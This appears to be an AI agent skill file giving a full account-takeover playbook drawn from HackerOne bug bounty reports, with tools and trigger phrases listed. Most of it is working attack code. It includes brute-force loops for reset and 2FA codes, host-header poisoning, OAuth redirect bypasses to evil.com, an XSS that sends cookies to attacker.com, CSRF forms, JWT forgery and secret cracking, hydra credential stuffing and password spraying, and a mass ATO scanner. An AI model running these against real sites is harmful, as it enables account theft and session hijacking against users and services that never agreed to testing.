---
name: ato-deep-dive
description: Complete Account Takeover methodology from 232 real HackerOne reports - every vector, bypass, technique, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - ato methodology
  - account takeover deep dive
  - ato complete
  - ato all techniques
  - skills ato
  - password reset takeover
  - session hijacking
  - oauth takeover
---

# Complete Account Takeover Methodology - From 232 HackerOne Reports

## Top 40 Real ATO Reports from HackerOne

| # | Report | Program | Technique | Upvotes | Bounty |
|---|--------|---------|-----------|---------|--------|
| 1 | #745324 - Leaked session cookie | HackerOne | Session cookie leakage | 1624 | $20,000 |
| 2 | #2293343 - Password reset without user interaction | GitLab | Password reset bypass | 919 | $35,000 |
| 3 | #737140 - HTTP Request Smuggling to steal session cookies | Slack | Request smuggling → ATO | 864 | $0 |
| 4 | #129873 - Digits origin validation bypass | X/xAI | OAuth origin bypass | 614 | $0 |
| 5 | #740037 - Request smuggling on admin-official.line.me | LY Corp | Request smuggling → ATO | 563 | $0 |
| 6 | #1342088 - Account takeover using AWS Cognito API | Flickr | Cognito API abuse | 436 | $0 |
| 7 | #314808 - Full account takeover | Reverb.com | Generic ATO | 409 | $0 |
| 8 | #744662 - Account takeover worki.ru | Mail.ru | Password reset | 391 | $1,700 |
| 9 | #563870 - CVE-2019-5765 Android takeover | Chrome | Android intent ATO | 375 | $0 |
| 10 | #1010522 - CSRF TikTok Careers Portal ATO | TikTok | CSRF → ATO | 366 | $0 |
| 11 | #773519 - Account takeover at my.33slona.ru | Mail.ru | Password reset | 359 | $1,700 |
| 12 | #905607 - Open redirect leads to ATO | CS Money | Open redirect → ATO | 356 | $0 |
| 13 | #2010530 - XSS ATO via login keylogger | Yelp | XSS → ATO | 321 | $0 |
| 14 | #143717 - Passwordless-signup ATO | Uber | Passwordless flow abuse | 309 | $0 |
| 15 | #534450 - Cookie manipulation + XSS ATO | Grammarly | Cookie + XSS | 289 | $0 |
| 16 | #723060 - Reflected XSS escalated to ATO | Razer | XSS → ATO | 287 | $750 |
| 17 | #110293 - OAuth callback validation bypass | X/Periscope | OAuth validation | 274 | $0 |
| 18 | #2831902 - 0-Click ATO via password reset | Remitly | Password reset | 274 | $0 |
| 19 | #876300 - ATO via IDOR | Starbucks | IDOR | 257 | $0 |
| 20 | #976603 - DOS SSO to ATO | Grammarly | SSO abuse | 255 | $10,500 |
| 21 | #1581240 - Mass account takeover | Stripe | Mass ATO | 250 | $0 |
| 22 | #463330 - CSRF account linking ATO | Rockstar Games | CSRF → OAuth linking | 237 | $0 |
| 23 | #3178999 - SCIM provisioning ATO | HackerOne | SCIM provisioning | 224 | $0 |
| 24 | #1089467 - Email ID change + forgot password ATO | New Relic | Email change | 214 | $2,048 |
| 25 | #317476 - Account takeover in Periscope TV | X/xAI | OAuth flow | 211 | $0 |
| 26 | #3081691 - 1-click ATO via auth token theft | Hostinger | Token theft | 210 | $0 |
| 27 | #915114 - IDOR editing users → ATO without interaction | Automattic | IDOR | 200 | $0 |
| 28 | #604120 - CSRF token leak + Stored XSS + ATO | InnoGames | Chain attack | 186 | $1,100 |
| 29 | #2443228 - Auth bypass in TikTok Account Recovery | TikTok | Auth bypass | 166 | $12,000 |
| 30 | #1667998 - 1-click ATO via deeplink Android | KAYAK | Deeplink | 165 | $0 |
| 31 | #1698316 - Cache Deception leads to ATO | Expedia | Cache deception | 156 | $0 |
| 32 | #3024673 - SSRF leading to ATO | Autodesk | SSRF → ATO | 155 | $0 |
| 33 | #862589 - Spring Actuator → ATO | LY Corp | Info disclosure | 143 | $5,000 |
| 34 | #206591 - Open redirect → ATO | Uber | Open redirect | 141 | $0 |
| 35 | #1760403 - JWT signature validation bypass | Linktree | JWT flaw | 141 | $0 |
| 36 | #730067 - ATO via password recovery | Mail.ru | Password reset | 139 | $3,000 |
| 37 | #2516732 - Insecure intent handling | Basecamp | Android intent | 134 | $0 |
| 38 | #1114347 - ATO due to misconfiguration | Mattermost | Config error | 131 | $0 |
| 39 | #922418 - SMS brute force → ATO | Mail.ru | SMS brute force | 121 | $0 |
| 40 | #1639802 - Full ATO without interaction on Sign with Apple | Glassdoor | OAuth/Sign with Apple | 118 | $0 |

## ATO Attack Surface - Every Attack Vector

### Password Reset Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| Token leakage in URL/referer | Reset token exposed in HTTP headers | #173551 - Uber ($10,000) |
| Token brute force | Weak/guessable reset tokens | #17512 - HackerOne |
| Token not expiring after use | Reusable reset links | #685007 - Imgur |
| Token not tied to user | Use token for different account | #2293343 - GitLab ($35,000) |
| Host header poisoning | Poison reset link host | #1108874 - DoD |
| Password reset without interaction | 0-click reset | #2831902 - Remitly |
| Email change before reset | Change email then request reset | #1089467 - New Relic |
| Race condition in reset | Parallel reset requests | #2142109 - Mars |
| SMS reset code brute force | No rate limit on SMS codes | #922418 - Mail.ru |
| Weak crypto in token generation | Predictable token generation | #271533 - Instacart |
| Password reset via response manipulation | Manipulate API response | #1994227 - IBM |
| Reset link via magic link interception | Intercept magic links | #855618 - Shopify |

### Session Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| Session fixation | Attacker fixes victim's session ID | #308394 - Khan Academy |
| Session cookie leakage | Cookie exposed via HTTP/Referer | #745324 - HackerOne ($20,000) |
| Session token not verified on changes | Change settings without session check | #6907 - IRCCloud |
| Session mismatch | Cross-service session confusion | #1825227 - Cloudflare |
| Weak session rotation | Session not rotated after auth | #263873 - GSA |
| Cache poisoning of session | Cache stores auth pages | #1698316 - Expedia |

### OAuth/OIDC Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| Redirect URI manipulation | Bypass redirect validation | #110293 - X/Periscope |
| State parameter bypass | Missing/invalid state validation | #1046630 - Logitech |
| CSRF on OAuth flow | Link attacker account to victim | #463330 - Rockstar |
| Scope escalation | Escalate OAuth scope | #671406 - Priceline |
| OAuth token reuse | Reuse token across accounts | #824931 - Grammarly |
| Missing PKCE enforcement | Code interception attack | #1639802 - Glassdoor |
| OAuth callback validation | Insufficient callback validation | #129873 - X Digits |
| OAuth misconfiguration | Improper config | #541701 - Vercel |
| Sign with Apple flow bypass | Apple auth bypass | #1639802 - Glassdoor |
| Google OneTap abuse | OneTap flow bypass | #671406 - Priceline |

### Email Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| Email change without verification | Change email, no confirmation | #538800 - Khan Academy |
| Email enumeration via response | Determine registered emails | #292673 - Coursera |
| Magic link interception | Steal magic link from email | #855618 - Shopify |
| Registration with existing email | Register victim's email again | #767829 - Starbucks |
| Abandoned email reuse | Use old unverified email | #1021232 - New Relic |
| Punycode email bypass | Unicode homograph in email | #922559 - Mail.ru |
| Email confirmation link reuse | Reuse old confirmation | #1817214 - Sorare |

### SMS/2FA Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| SMS code brute force | No rate limit on SMS codes | #922418 - Mail.ru |
| 2FA code brute force | Weak 2FA code validation | #407971 - Valve ($2,500) |
| 2FA bypass via direct endpoint | Skip 2FA step | #976603 - Grammarly ($10,500) |
| Backup code abuse | Reused/guessable backup codes | #281449 - Inflection |
| SMS interception | SIM swap/SMS intercept | #1245762 - Zenly |
| 2FA reset without verification | Reset 2FA settings | #2492631 - HackerOne |
| 2FA via OAuth linking | Link attacker 2FA | #810880 - Helium |

### IDOR Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| User ID manipulation | Change user ID in requests | #876300 - Starbucks |
| Email change via IDOR | Change other user's email | #915114 - Automattic |
| API IDOR to ATO | IDOR in API endpoints | #1695454 - Automattic |
| Mass IDOR to ATO | Enumerate all users | #685338 - DoD |
| IDOR in mobile API | Mobile endpoint IDOR | #950881 - Automattic |

### Chained Attacks
| Vector | Description | Real Report |
|--------|-------------|-------------|
| XSS → ATO | Steal session via XSS | #2010530 - Yelp, #723060 - Razer |
| CSRF → ATO | Forge requests to change credentials | #1010522 - TikTok, #235642 - X |
| SSRF → ATO | SSRF to internal auth service | #3024673 - Autodesk |
| Cache Deception → ATO | Cache poison auth pages | #1698316 - Expedia |
| Request Smuggling → ATO | Smuggle requests to steal sessions | #737140 - Slack, #740037 - LY Corp |
| Open Redirect → ATO | Redirect to steal OAuth tokens | #905607 - CS Money, #206591 - Uber |
| Clickjacking → ATO | IFrame overlay on settings | #2119892 - pixiv |
| CORS misconfig → ATO | Cross-origin read of auth data | #426147 - X, #758785 - Nord |
| Spring Actuator → ATO | Exposed actuator endpoints | #862589 - LY Corp ($5,000) |
| Chrome Intent → ATO | Android intent hijacking | #563870 - Chrome CVE-2019-5765 |
| ESI Injection → ATO | Edge-side include injection | #1073780 - DoD |

### SSO/SAML Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| SAML forging | Forge SAML assertions | #1923672 - GitLab |
| SSO DOS → ATO | DOS SSO, fallback to weak auth | #976603 - Grammarly ($10,500) |
| RelayState validation | Insufficient RelayState validation | #1923672 - GitLab |
| SAML signature stripping | Strip XML signature | #713900 - QIWI (SSRF → SSO → RCE) |

### JWT Based
| Vector | Description | Real Report |
|--------|-------------|-------------|
| Weak JWT signature | Weak/guessable secret | #1760403 - Linktree |
| Alg confusion (RS256 → HS256) | Algorithm confusion | #1760403 - Linktree |
| Exp validation bypass | No expiration check | #1760403 - Linktree |
| JWT kid injection | kid header injection | #1760403 - Linktree |
| JWT none algorithm | none alg accepted | #1760403 - Linktree |

## Step 1: Recon for ATO Vectors

### Identify Authentication Mechanisms
```bash
# Map all auth-related endpoints
grep -roE '(login|signin|signup|register|forgot|reset|password|oauth|saml|sso|2fa|mfa|verify|confirm|token|session|logout|recovery|magic|invite)' urls.txt | sort -u

# Check for OAuth flows
grep -roE '(oauth|openid|authorize|callback|redirect_uri|response_type|client_id|scope)' urls.txt | sort -u

# Find password reset endpoints
grep -roE '(reset|forgot|recover|reset_password|forgot_password|password_reset|new_password)' urls.txt | sort -u

# Find email change endpoints
grep -roE '(change.email|update.email|email.change|profile.email|account.email|email_update)' urls.txt | sort -u

# Find session/token endpoints
grep -roE '(session|token|api.key|api_token|access_token|refresh_token|jwt|bearer)' urls.txt | sort -u
```

### Check Every Auth Feature
| Feature | What to Test |
|---------|-------------|
| Login form | Brute force, rate limiting, credential stuffing |
| Registration | Email verification bypass, existing email reuse |
| Password reset | Token leakage, brute force, host header poisoning |
| Email change | Verification bypass, IDOR in email change |
| OAuth login | Redirect URI, state param, CSRF, scope escalation |
| 2FA/MFA setup | Bypass, backup codes, SMS brute force |
| API authentication | JWT strength, session tokens, API keys |
| Account deletion | Re-registration with same email |
| Linked accounts | CSRF in linking, OAuth account takeover |

## Step 2: Password Reset Testing

### Token Leakage Tests
```bash
# Check referer header for token leakage
curl -sk -I "https://{target}/password/reset?token=RESET_TOKEN"

# Check if token appears in URL after redirect
curl -sk -v "https://{target}/password/reset/init?email=victim@example.com" 2>&1 | grep -i location

# Test if token is in response body or headers
curl -sk "https://{target}/password/reset/init" -d "email=victim@example.com"

# Check HTTP referer header on external resources
# Attacker hosts an image on their server
<img src="http://attacker.com/steal?ref=">

# Check server logs, analytics, CDN logs for token leakage
```

### Token Brute Force Testing
```bash
# Identify token format and entropy
# Sample token: 8 chars alphanumeric = 62^8 = 218 trillion combinations
# Sample token: 6 digits numeric = 1M combinations (brute-forceable)
# Sample token: 4 digits numeric = 10K combinations (easily brute-forceable)

# Brute force 6-digit numeric tokens
for i in $(seq -w 000000 999999); do
  response=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}/password/reset?token=$i")
  if [ "$response" != "404" ] && [ "$response" != "400" ]; then
    echo "Possible valid token: $i (HTTP $response)"
  fi
done

# Use single-packet attack for race condition on reset
# Send all combinations in one TCP packet
```

### Token Binding Tests
```bash
# Test 1: Request reset for user A, use token on user B
curl -sk -c cookies.txt "https://{target}/password/reset/init" -d "email=userA@example.com"
# Extract token from email
curl -sk -b cookies.txt "https://{target}/password/reset/confirm" \
  -d "token=EXTRACTED_TOKEN&email=userB@example.com&password=NEWPASS"

# Test 2: Reuse old reset token after password change
# Step 1: Reset password, get token
# Step 2: Use token successfully
# Step 3: Reset again, try old token

# Test 3: Race condition - send multiple reset requests simultaneously
for i in {1..20}; do
  curl -sk "https://{target}/password/reset/init" -d "email=victim@example.com" &
done
wait
```

### Host Header Poisoning for Password Reset
```bash
# Inject host header to poison reset link
curl -sk -H "Host: attacker.com" "https://{target}/password/reset/init" \
  -d "email=victim@example.com"
# If the reset email contains http://attacker.com/reset?token=XYZ,
# attacker can intercept the token

# X-Forwarded-Host injection
curl -sk -H "X-Forwarded-Host: attacker.com" "https://{target}/password/reset/init" \
  -d "email=victim@example.com"

# X-Forwarded-Proto to downgrade to HTTP (leak token)
curl -sk -H "X-Forwarded-Proto: http" "https://{target}/password/reset/init" \
  -d "email=victim@example.com"
```

## Step 3: Session & OAuth Testing

### Session Fixation Test
```bash
# Step 1: Get a session cookie before login
curl -sk -c cookies.txt "https://{target}/"

# Step 2: Set this session ID as the victim's (via XSS, HTTP param, etc.)
# Step 3: Victim logs in - session is now authenticated
# Step 4: Attacker uses same session cookie
```

### OAuth Redirect URI Bypass Techniques
```bash
# 1. Direct URL change
redirect_uri=https://evil.com

# 2. Path traversal
redirect_uri=https://{target}/oauth/callback/../evil.com
redirect_uri=https://{target}/evil.com

# 3. Open redirect chaining
redirect_uri=https://{target}/redirect?url=https://evil.com

# 4. Subdomain takeover on registered redirect
redirect_uri=https://subdomain.{target}/ (subdomain = takeover)

# 5. Protocol smuggling
redirect_uri=javascript:alert(1)
redirect_uri=data:text/html,<script>location.href='https://evil.com?code='+url_param</script>

# 6. Port confusion
redirect_uri=https://{target}:8080/

# 7. Host header injection in redirect validation
curl -sk -H "Host: evil.com" "https://{target}/oauth/authorize?redirect_uri=https://evil.com"

# 8. URI confusion with fragment
redirect_uri=https://{target}#@evil.com
redirect_uri=https://{target}.evil.com

# 9. Null byte injection
redirect_uri=https://{target}%00@evil.com

# 10. Backslash confusion
redirect_uri=https://{target}\@evil.com

# 11. Unicode normalization
redirect_uri=https://еvіӏ.com (homograph)
```

### OAuth State Parameter Bypass
```bash
# Test 1: Remove state parameter entirely
curl -sk "https://{target}/oauth/authorize?client_id=ID&redirect_uri=URI&response_type=code&scope=openid"

# Test 2: Empty state parameter
curl -sk "https://{target}/oauth/authorize?client_id=ID&redirect_uri=URI&response_type=code&scope=openid&state="

# Test 3: Predictable/static state parameter
# Check if state is always same value or timestamp-based

# Test 4: Null byte in state
curl -sk "https://{target}/oauth/authorize?client_id=ID&redirect_uri=URI&response_type=code&scope=openid&state=%00"
```

## Step 4: Deep ATO Bypass Techniques

### 20+ ATO Bypass Methods

#### 1. Race Condition on Password Reset (Single-Packet Attack)
```bash
# Send all reset requests in a single TCP packet to hit race window
# Tools: Burp Turbo Intruder, httpx, custom Python with socket
python3 -c "
import socket, ssl, threading
target = ('target.com', 443)
emails = ['victim@a.com', 'victim@a.com', 'victim@a.com']
def send_payload():
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket()) as s:
        s.connect(target)
        s.sendall(b'POST /password/reset HTTP/1.1\r\nHost: target.com\r\n...')
threads = [threading.Thread(target=send_payload) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
"
```

#### 2. Email Verification Bypass
```bash
# Try to change email without verification
PUT /api/user/email HTTP/1.1
Content-Type: application/json
{"email": "attacker@evil.com"}

# Try to change email with unverified new email
POST /api/user/change-email HTTP/1.1
{"new_email": "attacker@evil.com", "verify": false}

# Bypass verification via parameter pollution
POST /api/user/change-email HTTP/1.1
{"new_email": "attacker@evil.com", "new_email": "victim@original.com"}
```

#### 3. 2FA/MFA Bypass Patterns
```bash
# Pattern 1: Direct endpoint access after MFA step
# Complete MFA step, observe endpoint called, repeat without MFA

# Pattern 2: 2FA code brute force (no rate limit)
for code in {000000..999999}; do
  curl -sk "https://{target}/2fa/verify" -d "code=$code"
done

# Pattern 3: 2FA code reuse (same code works multiple times)

# Pattern 4: Backup code enumeration (no rate limit)

# Pattern 5: OAuth token reuse across devices/sessions

# Pattern 6: Session token before MFA is valid after MFA step

# Pattern 7: Email/SMS 2FA interception
```

#### 4. JWT Algorithm Confusion
```bash
# Change RS256 to HS256 using public key as secret
# 1. Get the public key (often at /.well-known/jwks.json)
# 2. Modify JWT header: {"alg":"HS256"}
# 3. Sign with public key as HMAC secret

# None algorithm attack
# jwt header: {"alg":"none"}
# jwt payload: {"sub":"victim","iat":...}
# jwt signature: empty
```

#### 5. JWT Weak Secret Brute Force
```bash
# Brute force JWT secret
python3 -c "
import jwt
token = 'eyJhbGciOiJIUzI1NiJ9...'
with open('rockyou.txt') as f:
    for line in f:
        secret = line.strip()
        try:
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            print(f'Found secret: {secret}')
            print(decoded)
            break
        except:
            pass
"
```

#### 6. SAML Signature Stripping
```bash
# Remove Signature element from SAML response
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <!-- Remove <ds:Signature>...</ds:Signature> -->
</samlp:Response>
```

#### 7. CSRF on Account Linking
```bash
# Create malicious HTML page that auto-submits form
<html>
<body>
<form action="https://{target}/account/link" method="POST">
  <input type="hidden" name="provider" value="attacker-oauth">
  <input type="hidden" name="token" value="ATTACKER_TOKEN">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

#### 8. Open Redirect to Steal OAuth Codes
```bash
# Open redirect in OAuth flow
https://{target}/oauth/authorize?redirect_uri=https://{target}/open-redirect?url=https://evil.com/steal%3Fcode%3D

# Victim clicks, gets redirected to evil.com with code in URL
```

#### 9. Cache Poisoning for ATO
```bash
# Poison cache with attacker's session page
curl -sk -H "X-Forwarded-Host: attacker.com" "https://{target}/profile/settings"
# If CDN caches this, subsequent visitors see attacker's content

# Cache deception on session cookie
curl -sk "https://{target}/profile/settings.css" -H "Cookie: session=ATTACKER_SESSION"
# If cache treats .css as static, auth page gets cached
```

#### 10. SSRF to Internal Auth Service
```bash
# SSRF to internal auth endpoint
curl -sk "https://{target}/page?url=http://internal-auth.service:8080/admin/reset/user/victim"

# SSRF to steal session tokens from internal services
curl -sk "https://{target}/page?url=http://localhost:3000/api/session"
```

#### 11. Request Smuggling for Session Hijacking
```bash
# CL.TE smuggling to poison next request
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

# Next user's request gets routed to smuggled prefix
```

#### 12. Cookie Manipulation + XSS
```bash
# XSS that manipulates cookies to match attacker's session
<script>
document.cookie = "session=ATTACKER_SESSION_ID; domain=.target.com; path=/";
location.href = "https://target.com/profile";
</script>
```

#### 13. Deep Linking / Intent Hijacking (Mobile)
```bash
# Register same intent filter as target app
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <data android:scheme="targetapp" android:host="auth" />
</intent-filter>
# When user clicks deeplink, attacker's app intercepts the auth token
```

#### 14. Passwordless/Magic Link Interception
```bash
# Intercept magic link during transmission
# - Monitor HTTP referer headers
# - Check for link in URL parameters after redirect
# - Check if link is sent via API response (not just email)

# Race condition: request multiple magic links
for i in {1..10}; do
  curl -sk "https://{target}/auth/magic-link" -d "email=victim@example.com"
done
# Check which token validates the account
```

#### 15. SCIM Provisioning Abuse
```bash
# SCIM provisioner often auto-creates accounts with specific roles
# If attacker can trigger SCIM provisioning for an existing account,
# they can take over the account with the SCIM-set password

# Report #3178999 - HackerOne SCIM ATO
```

#### 16. Account Deletion → Re-registration
```bash
# 1. Find account deletion endpoint
# 2. Delete victim's account (if possible via CSRF or IDOR)
# 3. Re-register with victim's email
# 4. Create new account with attacker's password
```

#### 17. Response Manipulation
```bash
# Intercept and modify API response during registration/auth flow
# Change "email_verified: false" to "email_verified: true"
# Change "account_status: pending" to "account_status: active"
# Change "role: user" to "role: admin"
```

#### 18. Password Change Without Current Password
```bash
# Test if current password is required for password change
POST /api/user/change-password HTTP/1.1
{"new_password": "hacked123"}
# vs
POST /api/user/change-password HTTP/1.1
{"current_password": "wrongpass", "new_password": "hacked123"}
# vs
POST /api/user/change-password HTTP/1.1
{"current_password": "", "new_password": "hacked123"}
```

#### 19. Email Change Without Verification (Weak Confirmation)
```bash
# Test if email change link requires old email confirmation
# Test if email change can be done via API directly
# Test if email change confirmation link doesn't invalidate existing session

# Test race condition: change email + reset password simultaneously
```

#### 20. Credential Stuffing / Password Spraying
```bash
# Credential stuffing - reuse breached passwords
hydra -L emails.txt -P rockyou.txt -t 64 target.com http-post-form "/login:email=^USER^&password=^PASS^:F=Invalid"

# Password spraying - common passwords across many accounts
for email in $(cat emails.txt); do
  curl -sk "https://{target}/login" -d "email=$email&password=Spring2024!"
done
```

#### 21. OAuth Token / Session Token Leakage via Referer
```bash
# Place external resource in OAuth authorization page
<img src="https://attacker.com/collect">

# If OAuth flow includes token in URL, it leaks via Referer header
# Test by: including external image, checking access logs for Referer with tokens
```

#### 22. Session Token in URL Logging
```bash
# Test if session/token is passed in URL parameters
# Check server logs, analytics, CDN logs, reverse proxy logs
# If yes, any third-party resource loaded on page can steal the token
```

## Step 5: Chain Attack Construction

### Chain 1: XSS → Cookie Theft → ATO
```bash
# Step 1: Find stored/reflected XSS
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

# Step 2: Steal session cookie
# Step 3: Import session cookie and access account

# Report examples: #2010530 (Yelp - 321 upvotes), #723060 (Razer - $750)
```

### Chain 2: CSRF → Email Change → Password Reset → ATO
```bash
# Step 1: CSRF to change victim's email
POST /account/email HTTP/1.1
Host: target.com
Cookie: (victim's session)
Content-Type: application/json

{"email": "attacker@evil.com"}

# Step 2: Request password reset to attacker's email
POST /password/reset HTTP/1.1
Host: target.com

{"email": "attacker@evil.com"}

# Step 3: Click reset link, set new password
# Step 4: Login with attacker's password

# Report examples: #1010522 (TikTok - 366 upvotes)
```

### Chain 3: Request Smuggling → Session Hijacking → Mass ATO
```bash
# Step 1: Find HTTP request smuggling vulnerability
# (CL.TE, TE.CL, TE.TE)

# Step 2: Smuggle request that poisons socket
# Next user's request gets prepended to smuggled request

# Step 3: Steal session cookies from smuggled requests
# Step 4: Use sessions to access accounts

# Report examples: #737140 (Slack - 864 upvotes), #740037 (LY Corp - 563 upvotes)
```

### Chain 4: SSRF → Internal Auth Service → ATO
```bash
# Step 1: Find SSRF in application
# Step 2: Target internal auth/reset endpoints
curl -sk "https://{target}/ssrf?url=http://internal-auth:8080/admin/users/victim/reset-password"

# Step 3: If internal service returns new password or reset token,
# use it to login as victim

# Report example: #3024673 (Autodesk - 155 upvotes)
```

### Chain 5: Cache Deception → Session Leak → ATO
```bash
# Step 1: Find cacheable endpoint that returns sensitive content
# Step 2: Trick CDN into caching authenticated response
curl -sk "https://{target}/profile/settings/test.css" \
  -H "Cookie: session=victim-session"

# Step 3: Access cached page to see victim's data
# Step 4: Use leaked session/CSRF tokens for ATO

# Report example: #1698316 (Expedia - 156 upvotes)
```

### Chain 6: OAuth CSRF → Account Linking → ATO
```bash
# Step 1: Attacker creates OAuth app that links to their account
# Step 2: CSRF to link victim's account to attacker's OAuth provider
<html>
<form action="https://{target}/oauth/connect" method="POST">
<input type="hidden" name="provider" value="attacker-oauth">
<input type="hidden" name="code" value="ATTACKER_OAUTH_CODE">
</form>
<script>document.forms[0].submit()</script>
</html>

# Step 3: Attacker logs in with OAuth → accesses victim's account

# Report examples: #463330 (Rockstar Games - 237 upvotes)
```

### Chain 7: Open Redirect → OAuth Token Theft → ATO
```bash
# Step 1: Find open redirect in OAuth flow
# Step 2: Create malicious redirect chain
https://{target}/oauth/authorize?redirect_uri=https://{target}/open-redirect?url=https://evil.com/steal%3Fcode%3D

# Step 3: Victim authorizes, gets redirected to evil.com with code
# Step 4: Attacker uses code to obtain access token → ATO

# Report examples: #905607 (CS Money - 356 upvotes), #206591 (Uber - 141 upvotes)
```

### Chain 8: IDOR → Email Change → Mass ATO
```bash
# Step 1: Find IDOR in user/email update endpoint
PUT /api/v2/users/{user_id}/email HTTP/1.1
{"email": "attacker@evil.com"}

# Step 2: Enumerate user IDs
# Step 3: Change all users' emails to attacker-controlled
# Step 4: Request password resets for all changed emails
# Step 5: Access all accounts

# Report examples: #915114 (Automattic - 200 upvotes), #685338 (DoD)
```

## ATO Automation

### Automated Token Analysis
```bash
#!/bin/bash
# Extract and analyze password reset tokens
TOKENS=$(curl -sk "https://{target}/password/reset?email=test@example.com" \
  | grep -oE 'token=[a-zA-Z0-9._-]+')

# Check token length and character set
echo "$TOKENS" | while read token; do
  len=${#token}
  echo "Token: $token (length: $len)"
  chars=$(echo "$token" | sed 's/./&\n/g' | sort -u | tr -d '\n')
  echo "Character set: $chars (${#chars} unique chars)"
  entropy=$(echo "scale=2; l(${#chars}^$len)/l(2)" | bc -l)
  echo "Entropy: $entropy bits"
done
```

### JWT Analysis & Attack Script
```bash
#!/bin/bash
# Analyze JWT tokens for weaknesses
analyze_jwt() {
  TOKEN=$1
  HEADER=$(echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null)
  PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)

  echo "Header: $HEADER"
  echo "Payload: $PAYLOAD"

  # Check algorithm
  if echo "$HEADER" | grep -q '"alg":"none"'; then
    echo "[!] None algorithm detected"
  fi
  if echo "$HEADER" | grep -q '"alg":"HS256"'; then
    echo "[!] Symmetric algorithm - may be vulnerable to public key confusion"
  fi

  # Check expiration
  EXP=$(echo "$PAYLOAD" | python3 -c "import sys,json; print(json.load(sys.stdin).get('exp','N/A'))" 2>/dev/null)
  echo "Expiration claim: $EXP"
}

# Test common JWT weaknesses
for token in $(cat jwt_tokens.txt); do
  analyze_jwt "$token"
  # Test none algorithm
  echo -n "$token" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
header = json.dumps({'alg':'none','typ':'JWT'})
header_b64 = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
payload = parts[1]
print(f'None alg JWT: {header_b64}.{payload}.')
"
done
```

### Mass ATO Scanner
```bash
#!/bin/bash
# Automated ATO vulnerability scanning script
TARGET=$1
OUTPUT="ato_results_$TARGET.txt"

: > "$OUTPUT"

echo "[*] Testing password reset token leakage..."
curl -sk -v "https://$TARGET/password/reset" -d "email=test@test.com" 2>&1 | \
  tee -a "$OUTPUT"

echo "[*] Testing email change without verification..."
curl -sk -X PUT "https://$TARGET/api/user/email" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' >> "$OUTPUT" 2>&1

echo "[*] Testing OAuth redirect URI manipulation..."
curl -sk "https://$TARGET/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code" \
  >> "$OUTPUT" 2>&1

echo "[*] Testing host header poisoning on password reset..."
curl -sk -H "Host: attacker.com" "https://$TARGET/password/reset" \
  -d "email=test@test.com" >> "$OUTPUT" 2>&1

echo "[*] Testing session fixation..."
curl -sk -c /tmp/session.txt "https://$TARGET/login" >> "$OUTPUT" 2>&1

echo "[*] Testing JWT weaknesses..."
curl -sk "https://$TARGET/api/user" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ." \
  >> "$OUTPUT" 2>&1

echo "[*] Results saved to $OUTPUT"
```

### ffuf for ATO Parameter Fuzzing
```bash
# Fuzz open redirect endpoints
ffuf -u "https://{target}/FUZZ?url=https://evil.com" \
  -w endpoints.txt -mc all -fc 404

# Fuzz password reset endpoints
ffuf -u "https://{target}/FUZZ" \
  -w password_reset_endpoints.txt \
  -d "email=test@test.com" -X POST -mc 200,302,301

# Fuzz IDOR in user endpoints
ffuf -u "https://{target}/api/v1/users/FUZZ" \
  -w ids.txt -H "Cookie: session=YOUR_SESSION" -mc 200

# Fuzz OAuth redirect_uri validation
ffuf -u "https://{target}/oauth/authorize?client_id=ID&redirect_uri=FUZZ&response_type=code" \
  -w redirect_bypasses.txt -mc 200,302,301
```

## Real ATO Reports by Attack Technique

| Technique | Best Reports |
|-----------|-------------|
| **Password Reset** | #2293343 ($35K, GitLab), #2831902 (Remitly), #173551 ($10K, Uber) |
| **Session Hijacking** | #745324 ($20K, HackerOne), #737140 (864 upvotes, Slack) |
| **OAuth/OIDC** | #129873 (614 upvotes, X), #110293 (274 upvotes, X/Periscope) |
| **CSRF** | #1010522 (TikTok), #463330 (Rockstar) |
| **XSS** | #2010530 (Yelp), #723060 ($750, Razer), #534450 (Grammarly) |
| **IDOR** | #876300 (Starbucks), #915114 (Automattic) |
| **JWT** | #1760403 (Linktree) |
| **Request Smuggling** | #737140 (Slack), #740037 (LY Corp) |
| **SSRF** | #3024673 (Autodesk) |
| **Cache Deception** | #1698316 (Expedia) |
| **SMS/2FA** | #922418 (Mail.ru), #407971 ($2,500, Valve) |
| **SSO/SAML** | #976603 ($10,500, Grammarly), #1923672 ($2,450, GitLab) |
| **SCIM** | #3178999 (HackerOne) |
| **Mobile/Intent** | #563870 (Chrome CVE), #1667998 (KAYAK) |

## Vulnerable Endpoints to Check

```
/login
/signin, /signup, /register
/forgot-password, /reset-password, /password/reset
/change-password, /password/change
/account/email, /profile/email, /email/change, /api/user/email
/account/delete, /profile/delete
/oauth/authorize, /oauth/callback, /oauth/token
/oauth/connect, /account/link, /social/link
/2fa/verify, /mfa/verify, /two-factor
/api/token, /api/key, /api/session
/saml/acs, /saml/login, /sso/callback
/.well-known/jwks.json, /.well-known/openid-configuration
/actuator, /actuator/env, /actuator/heapdump
```

## ATO Prevention Features to Identify

When testing, look for these protection mechanisms and try to bypass them:
- Rate limiting on login/password reset/SMS codes
- Account lockout after failed attempts
- Email verification for email changes
